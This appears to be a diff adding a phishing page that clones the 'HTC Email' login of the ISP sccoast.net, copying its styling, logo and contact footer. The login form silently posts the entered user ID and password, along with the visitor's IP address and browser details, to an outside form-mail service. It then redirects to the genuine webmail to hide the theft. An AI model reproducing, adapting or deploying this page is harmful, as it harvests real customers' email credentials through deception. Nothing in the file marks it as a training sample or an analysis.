@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+	<title>HTC Email</title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	
+	<link rel="shortcut icon" href="https://sso.sccoast.net/googleauthn/images/favicon.ico">
+	<link rel="stylesheet" href="https://sso.sccoast.net/googleauthn/css/bootstrap.min.css">
+	<link rel="stylesheet" href="https://sso.sccoast.net/googleauthn/css/styles.css">
+	
+	<script src="https://sso.sccoast.net/googleauthn/js/jquery.slim.min.js"></script>
+	<script src="https://sso.sccoast.net/googleauthn/js/popper.min.js" ></script>
+	<script src="https://sso.sccoast.net/googleauthn/js/bootstrap.min.js"></script>
+	<script src="https://sso.sccoast.net/googleauthn/js/jquery.validate.min.js"></script>
+	<script>
+		$(function(){
+			$("#loginForm").validate({
+				rules: {
+					j_username: {
+						required: true,
+						minlength: 2,
+						maxlength: 30
+					},
+					j_password: {
+						required: true,
+						minlength: 2,
+						maxlength: 30
+					}
+				},
+				messages: {
+					j_username: " *required", j_password: " *required"
+				},
+				errorPlacement: function(error, element) {
+					error.appendTo(element.next('div'));
+				},
+				submitHandler: function(form) {
+					var username = $('#j_username').val();
+					username = username.replace('@sccoast.net', '');
+					$('#j_username').val(username);
+					form.submit();
+				}
+			});
+		});
+	</script>
+	
+</head>
+<body>
+	
+	<!-- content -->
+	<div class="content">
+		<!-- navbar -->
+		<nav class="navbar navbar-expand-lg color-main-blue navbar-dark mb-2">
+			<div class="container">
+				<a class="navbar-brand" href="http://www.htcinc.net/" target="_blank"><img src="https://sso.sccoast.net/googleauthn/images/htclogo.png" class="img-fluid" style="width: 140px; height: 65px;"></a>
+				<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+					<span class="navbar-toggler-icon"></span>
+				</button>			
+				<div class="collapse navbar-collapse" id="navbarSupportedContent">
+					<ul class="navbar-nav ml-auto">
+						<li class="nav-item">
+							<a class="nav-link" href="http://www.htcconnect.com/">HTC Connect&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+						</li>
+						<li class="nav-item dropdown">
+							<a class="nav-link dropdown-toggle" href="#" id="navbarCustomerServiceDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+								Customer Service
+							</a>
+							<div class="dropdown-menu" aria-labelledby="navbarCustomerServiceDropdown">
+								<a class="dropdown-item" href="https://myaccount.htcinc.net/" target="_blank">My Account</a>
+								<div class="dropdown-divider"></div>
+								<a class="dropdown-item" href="http://www.htcinc.net/customer-service/" target="_blank">Contact Us</a>
+							</div>
+						</li>
+					</ul>
+				</div>
+			</div>
+		</nav>
+		<!-- end navbar -->
+		
+		<div class="container-fluid">
+		
+			<h3>HTC Email</h3>
+		
+			
+													
+			<div class="row">
+				<form action="https://fp1.formmail.com/cgi-bin/fm192" method="post" id="loginForm">
+<input type="hidden" name="_pid" value="159922">
+<input type="hidden" name="_fid" value="OUMOK60X">
+<input type="hidden" name="recipient" value="2">
+<input type="hidden" name="env_report" value="REMOTE_ADDR,HTTP_USER_AGENT">
+<input type="hidden" name="print_config" value="email">
+<input type="hidden" name="redirect" value="https://webmail.sccoast.net/mail#10">
+											<label for="j_username">User Id:</label>
+						<div class="input-group mb-3">
+							<input type="text" class="form-control" id="j_username" name="j_username" placeholder="User Id" maxlength="300" autocapitalize="none" autofocus="true" aria-describedby="sccoastAddon" >
+							<div class="input-group-append">
+								<span class="input-group-text" id="sccoastAddon" name="j_username_error">@sccoast.net</span>
+							</div>
+						</div>
+						<label for="j_password">Password:</label>
+						<div class="input-group mb-3">
+							<input type="password" class="form-control" id="j_password" name="j_password" placeholder="Password" maxlength="300">
+							<div></div>
+						</div>
+						<div class="input-group">
+							<input type="hidden" name="donotcache" value="1">
+						</div>
+						<button type="submit" class="btn btn-primary" name="_eventId_proceed">Sign In</button>
+						<br><br>
+						<a href="https://memberservices.sccoast.net/" target="_blank">Register</a>
+									</form>
+			</div>
+		</div>
+	</div>
+	<!-- end content -->
+	
+	<!-- footer -->
+	<nav class="mt-5 navbar color-gray-lightest footer">
+		<div class="container-fluid color-gray-lightest py-2">
+			<div class="container">
+				<div class="row">
+					<div class="col-md-12 text-center footer-text">
+						Contact Us - <a href="https://sso.sccoast.net/tel:843-365-2154">843-365-2154</a> or <a href="https://sso.sccoast.net/tel:800-824-6779">800-824-6779</a><br>
+						3480 Hwy 701 North, Conway, SC 29526<br>
+						Copyright &copy; 2018 &#8729; HTC Inc.
+					</div>
+				</div>
+			</div>
+		</div>
+	</nav>
+	<!-- end footer -->
+	
+</body>
+</html>
